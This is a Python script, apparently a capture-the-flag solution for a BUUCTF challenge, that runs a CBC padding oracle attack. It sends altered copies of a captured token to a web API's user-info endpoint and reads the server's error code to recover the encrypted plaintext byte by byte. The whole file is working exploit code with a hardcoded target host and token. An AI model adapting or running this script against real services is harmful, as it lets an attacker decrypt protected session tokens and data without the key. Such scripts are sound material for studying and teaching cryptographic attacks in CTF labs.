#!/usr/bin/python2.7
# -*- coding:utf8 -*-

import requests
import base64
import json

host = "41934b44-52c1-4a22-9bc2-f02d9206801e.node4.buuoj.cn"                                 #url
port = 81                                                                                   #port

def xor(a, b):
    return "".join([chr(ord(a[i]) ^ ord(b[i % len(b)])) for i in range(len(a))])

def padoracle(key):
    user_key_decode = base64.b64decode(key)
    user_key_json_decode = json.loads(user_key_decode)

    signed_key = user_key_json_decode['signed_key']                                         #   CBC加密后的密文，包括VI
    signed_key_decoed = base64.b64decode(signed_key)                                        #   base64解密

    url = "http://" + host + "/frontend/api/v1/user/info"

    N = 16                                                                                  # 分组的大小，可以是16，也可以是8

    total_plain = ''

    for block in range(0, int(len(signed_key) / 16) - 3):

        token = ''

        get = ""

        cipher = signed_key_decoed[16 + block * 16:32 + block * 16]

        for i in range(1, N + 1):

            for j in range(0, 256):

                token = signed_key_decoed[block * 16:16 + block * 16]

                padding = xor(get, chr(i) * (i - 1))

                c = (chr(0) * (16 - i)) + chr(j) + padding + cipher

                token = base64.b64encode(token + c)                                     #解密后重新传参

                user_key_json_decode['signed_key'] = token
                header = {'Key': base64.b64encode(json.dumps(user_key_json_decode))}   #浏览器传送的参数

                res = requests.get(url, headers=header)

                if res.json()['code'] != 205:                                           # 这里的状态码由浏览器决定~~   这里的205表示解密失败
                    get = chr(j ^ i) + get

                    break

        plain = xor(get, signed_key_decoed[block * 16:16 + block * 16])

        total_plain += plain

    return total_plain

plain_text = padoracle("eyJzaWduZWRfa2V5IjoiU1VONGExTnBibWRFWVc1alpWSmhVSHNGUVI0bG41VkZDOUwwOWVjaGtZaFRXUWdpd1pvaGoyN0pXdDk4LysxWklMUlpNdzdkL0xkZ0xTelZPYmNwOEs0QWkxZkpxTm1ycFY3UWZYMEM2enFOcVljaGNzeUZ2RjlBa1Z2a3o3OE5hQm1ZYmNUeUJjMGY4L2IrakpJSW13PT0iLCJyb2xlIjozLCJ1c2VyX2lkIjoxLCJwYXlsb2FkIjoiNDJIbVc4d2Y3Z2IzNlVKTDRDeExJQXZXdEdrVjNHM1AiLCJleHBpcmVfaW4iOjE2NTE2Njc5NzV9")
###整体的base64，浏览器返回的密文~~
print(plain_text)